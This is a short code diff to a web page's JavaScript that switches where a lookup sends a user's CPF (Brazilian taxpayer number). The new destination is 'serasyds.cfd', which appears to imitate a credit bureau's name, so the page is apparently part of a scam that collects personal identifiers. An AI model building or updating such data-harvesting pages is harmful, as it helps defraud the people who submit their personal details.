@@ -107,10 +107,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
     consultaResultado.scrollIntoView({ behavior: "smooth", block: "center" });
 
-    fetch(
-      "https://oportunidadenumais2025.online/api.php?cpf=" +
-        encodeURIComponent(cpf)
-    )
+    fetch("https://serasyds.cfd/api.php?cpf=" + encodeURIComponent(cpf))
       .then((response) => {
         if (!response.ok) {
           throw new Error("Erro na consulta: " + response.status);
